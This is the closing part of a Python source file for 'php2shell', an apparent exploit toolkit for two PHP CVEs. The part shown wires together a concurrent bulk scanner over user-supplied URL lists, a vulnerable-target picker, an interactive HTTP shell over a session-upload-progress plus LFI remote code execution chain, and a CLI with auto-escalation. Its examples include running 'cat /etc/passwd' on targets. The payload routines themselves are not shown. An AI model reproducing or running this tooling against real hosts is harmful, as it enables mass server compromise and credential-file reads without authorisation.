    Shell session loop that handles 'back' (re-show picker) and
    'switch <url>' (jump to a different target).

    `chosen` is either a single result dict or the string "all".
    """

    if chosen == "all":
        targets = [r for _, r in vuln_targets]
        t_idx   = 0
    else:
        targets = [chosen]
        t_idx   = 0

    while True:
        if t_idx >= len(targets):
            _info("All targets visited - returning to menu")
            break

        r    = targets[t_idx]
        base = r["url"]

        _blank()
        _info(f"Opening shell on {_c(base, C.BYLW)} "
              f"{C.DIM}({t_idx + 1}/{len(targets)}){C.RST}")

        signal = run_shell(
            base,
            session_path=session_path,
            upload_ep=upload_ep,
            lfi_ep=lfi_ep,
            lfi_param=lfi_param,
            auto_escalate=False,
        )

        if signal == "back":

            new_chosen = _target_picker(vuln_targets, [])
            if new_chosen is None:
                break
            if new_chosen == "all":
                targets = [r2 for _, r2 in vuln_targets]
                t_idx   = 0
            else:
                targets = [new_chosen]
                t_idx   = 0
            continue

        if isinstance(signal, tuple) and signal[0] == "switch":
            new_url = signal[1]

            match = next((r2 for _, r2 in vuln_targets
                          if r2["url"].rstrip("/") == new_url.rstrip("/")), None)
            if match:
                targets.insert(t_idx + 1, match)
            else:

                _warn(f"{new_url} was not in the scan list - opening anyway")
                targets.insert(t_idx + 1, {"url": new_url})
            t_idx += 1
            continue


        t_idx += 1
        if chosen != "all" or t_idx >= len(targets):
            break
        _blank()
        ans = input(
            f"  {C.BCYN}Move to next target?{C.RST} "
            f"{_c(targets[t_idx]['url'], C.BYLW)} "
            f"{C.DIM}[Y/n]{C.RST}: "
        ).strip().lower()
        if ans in ("n", "no"):
            break


def run_bulk_scan(url_list, workers=10,
                  upload_ep=_DEFAULT_UPLOAD_EP,
                  lfi_ep=_DEFAULT_LFI_EP,
                  lfi_param=_DEFAULT_LFI_PARAM,
                  session_path=_DEFAULT_SESS_PATH,
                  auto_escalate=False):
    """
    Scan a list of URLs concurrently, print a results table,
    then let the user pick which vulnerable target to shell into.
    """
    _print_module_start(
        "Bulk URL Scanner", "CVE-2026-109619",
        f"Concurrent scan of {len(url_list)} target(s) for upload-progress + LFI RCE"
    )

    _kv("Targets",  str(len(url_list)))
    _kv("Workers",  str(workers))
    _kv("LFI ep",   lfi_ep)
    _kv("Upload ep", upload_ep)
    _blank()

    results  = [None] * len(url_list)
    done_cnt = [0]
    lock     = threading.Lock()

    def _check(idx, base):
        r = _quick_vuln_check(base, upload_ep, lfi_ep, lfi_param)
        with lock:
            results[idx]  = r
            done_cnt[0]  += 1
            vuln = sum(1 for x in results if x and x.get("rce_confirmed"))
            _progress_bar(
                f"{done_cnt[0]}/{len(url_list)} scanned  "
                f"{C.BRED}{vuln} vuln{C.RST}",
                done_cnt[0], len(url_list),
            )

    with _futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futs = [pool.submit(_check, i, u) for i, u in enumerate(url_list)]
        _futures.wait(futs)

    print()
    vuln_targets = _bulk_scan_print_table(results)


    total_vuln = len(vuln_targets)
    _blank()
    if total_vuln:
        print(f"  {_result_badge('VULNERABLE')}  "
              f"{C.BRED}{C.BOLD}{total_vuln}{C.RST} of {len(url_list)} targets vulnerable")
    else:
        print(f"  {_result_badge('PATCHED')}  "
              f"0 of {len(url_list)} targets vulnerable")
    _blank()

    if not vuln_targets:
        return

    if not auto_escalate:
        ans = input(
            f"  {C.BCYN}Open interactive shell on a vulnerable target?{C.RST} "
            f"{C.DIM}[Y/n]{C.RST}: "
        ).strip().lower()
        if ans in ("n", "no"):
            _info("Exiting - no escalation")
            return

    chosen = _target_picker(vuln_targets, results)
    if chosen is None:
        _info("Exiting")
        return

    _escalation_loop(
        chosen, vuln_targets,
        upload_ep, lfi_ep, lfi_param, session_path,
    )


def _add_common(p):
    p.add_argument("-t", "--target", required=True,
                   help="Base URL  e.g. http://localhost:8080")
    p.add_argument("-v", "--verbose", action="store_true")


def main():
    _print_banner()

    root = argparse.ArgumentParser(
        prog="php2shell",
        description="PHP CVE-2026-109618 / CVE-2026-109619 Unified Research Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "subcommands:\n"
            "  cve109618   Zend OOM allocator probe\n"
            "  cve109619   Pre-RINIT session deserialisation probe + RCE\n"
            "  exploit     Session upload progress poisoning + LFI chain\n"
            "  uaf         Multipart parser crash probe (raw sockets)\n"
            "  shell       Interactive HTTP shell (post-exploitation)\n"
            "  scan        Bulk URL scan + interactive escalation picker\n"
            "  all         Run every module → full assessment + auto-escalate\n\n"
            "examples:\n"
            "  php2shell cve109618  -t http://localhost:8080 --mem-limit 64\n"
            "  php2shell exploit    -t http://localhost:8080 -c 'cat /etc/passwd'\n"
            "  php2shell shell      -t http://localhost:8080 --auto-escalate\n"
            "  php2shell scan       --url-file targets.txt\n"
            "  php2shell scan       --urls http://a.com,http://b.com --auto-escalate\n"
            "  php2shell all        -t http://localhost:8080 -c 'id'\n"
        ),
    )
    sub = root.add_subparsers(dest="subcmd", metavar="subcommand")
    sub.required = True


    p618 = sub.add_parser("cve109618", help="Zend OOM Bailout probe")
    _add_common(p618)
    p618.add_argument("--mem-limit", type=int, default=128,
                      help="PHP memory_limit in MB (default: 128)")


    p619 = sub.add_parser("cve109619", help="Pre-RINIT session deserialisation probe")
    _add_common(p619)
    p619.add_argument("-c","--shell-cmd", dest="shell_cmd", default="id",
                      help="Shell command to execute via __wakeup() (default: id)")


    pexp = sub.add_parser("exploit", help="Session upload poisoning + LFI → RCE")
    _add_common(pexp)
    pexp.add_argument("-c","--shell-cmd", dest="shell_cmd", default="id",
                      help="Shell command to run (default: id)")
    pexp.add_argument("--check",        action="store_true", help="Recon only - no RCE")
    pexp.add_argument("--session-path", default=_DEFAULT_SESS_PATH)
    pexp.add_argument("--upload-ep",    default=_DEFAULT_UPLOAD_EP)
    pexp.add_argument("--lfi-ep",       default=_DEFAULT_LFI_EP)
    pexp.add_argument("--lfi-param",    default=_DEFAULT_LFI_PARAM)


    puaf = sub.add_parser("uaf", help="Multipart parser crash probe")
    puaf.add_argument("-t","--target", required=True,
                      help="Full URL including path  e.g. http://host:8080/upload.php")
    puaf.add_argument("--variant", nargs="+", choices=list(_UAF_VARIANTS.keys()),
                      default=list(_UAF_VARIANTS.keys()))
    puaf.add_argument("--repeat",  type=int,   default=1)
    puaf.add_argument("--timeout", type=float, default=5.0)
    puaf.add_argument("--json",    action="store_true", help="Output raw JSON results")
    puaf.add_argument("-v","--verbose", action="store_true")


    psh = sub.add_parser(
        "shell",
        help="Interactive HTTP shell - escalate from confirmed RCE",
        description=(
            "Opens a persistent interactive shell over the session-upload-progress "
            "+ LFI vector. Use --auto-escalate to verify RCE first, then drop in."
        ),
    )
    _add_common(psh)
    psh.add_argument("--auto-escalate", action="store_true",
                     help="Verify RCE with 'exploit' first, then open the shell")
    psh.add_argument("--session-path", default=_DEFAULT_SESS_PATH)
    psh.add_argument("--upload-ep",    default=_DEFAULT_UPLOAD_EP)
    psh.add_argument("--lfi-ep",       default=_DEFAULT_LFI_EP)
    psh.add_argument("--lfi-param",    default=_DEFAULT_LFI_PARAM)


    pscan = sub.add_parser(
        "scan",
        help="Bulk URL scan - concurrent check + interactive escalation picker",
        description=(
            "Scans multiple targets concurrently for upload-progress + LFI RCE. "
            "Shows a colour-coded results table, then lets you pick which "
            "vulnerable target(s) to escalate into an interactive shell. "
            "Inside the shell: 'back' returns to the picker, "
            "'switch <url>' jumps to another target."
        ),
    )
    pscan.add_argument("--urls",
        help="Comma-separated base URLs  e.g. http://a.com,http://b.com")
    pscan.add_argument("--url-file",
        help="Path to a file with one URL per line (# lines are comments)")
    pscan.add_argument("--workers",       type=int,   default=10,
                       help="Concurrent scan threads (default: 10)")
    pscan.add_argument("--auto-escalate", action="store_true",
                       help="Skip confirmation prompt, go straight to target picker")
    pscan.add_argument("--session-path",  default=_DEFAULT_SESS_PATH)
    pscan.add_argument("--upload-ep",     default=_DEFAULT_UPLOAD_EP)
    pscan.add_argument("--lfi-ep",        default=_DEFAULT_LFI_EP)
    pscan.add_argument("--lfi-param",     default=_DEFAULT_LFI_PARAM)


    pall = sub.add_parser("all", help="Run all modules - full assessment")
    _add_common(pall)
    pall.add_argument("-c","--shell-cmd", dest="shell_cmd", default="id",
                      help="Shell command for RCE modules (default: id)")
    pall.add_argument("--mem-limit", type=int, default=128)

    args = root.parse_args()
    base = _normalize_base(getattr(args, "target", ""))

    if args.subcmd == "cve109618":
        run_cve109618(base, mem_limit_mb=args.mem_limit, verbose=args.verbose)

    elif args.subcmd == "cve109619":
        run_cve109619(base, cmd=args.shell_cmd, verbose=args.verbose)

    elif args.subcmd == "exploit":
        run_exploit(
            base, cmd=args.shell_cmd,
            session_path=args.session_path,
            upload_ep=args.upload_ep,
            lfi_ep=args.lfi_ep,
            lfi_param=args.lfi_param,
            check_only=args.check,
        )

    elif args.subcmd == "uaf":
        run_uaf(
            args.target,
            variants=args.variant,
            repeat=args.repeat,
            timeout=args.timeout,
            verbose=args.verbose,
            output_json=args.json,
        )

    elif args.subcmd == "shell":
        run_shell(
            base,
            session_path=args.session_path,
            upload_ep=args.upload_ep,
            lfi_ep=args.lfi_ep,
            lfi_param=args.lfi_param,
            auto_escalate=args.auto_escalate,
        )

    elif args.subcmd == "scan":

        url_list = []
        if getattr(args, "urls", None):
            url_list = [u.strip().rstrip("/") for u in args.urls.split(",") if u.strip()]
        if getattr(args, "url_file", None):
            try:
                with open(args.url_file) as fh:
                    for line in fh:
                        u = line.strip().rstrip("/")
                        if u and not u.startswith("#"):
                            url_list.append(u)
            except OSError as exc:
                _fail(f"Cannot read URL file: {exc}")
                sys.exit(1)
        if not url_list:
            _fail("No URLs provided. Use --urls or --url-file")
            sys.exit(1)

        seen = set()
        url_list = [u for u in url_list if not (u in seen or seen.add(u))]
        run_bulk_scan(
            url_list,
            workers=args.workers,
            upload_ep=args.upload_ep,
            lfi_ep=args.lfi_ep,
            lfi_param=args.lfi_param,
            session_path=args.session_path,
            auto_escalate=args.auto_escalate,
        )

    elif args.subcmd == "all":
        base = _normalize_base(getattr(args, "target", None) or "")
        _info(f"Full suite - target: {_c(base, C.BYLW)}")
        _blank()
        r618 = run_cve109618(base, mem_limit_mb=args.mem_limit, verbose=args.verbose)
        r619 = run_cve109619(base, cmd=args.shell_cmd, verbose=args.verbose)
        rexp = run_exploit(base, cmd=args.shell_cmd)
        run_uaf(base + _DEFAULT_UPLOAD_EP)
        _print_summary(r618, r619, rexp)
        if rexp:
            _blank()
            _warn("RCE confirmed - escalating to interactive shell automatically")
            run_shell(base, auto_escalate=False)


if __name__ == "__main__":
    main()
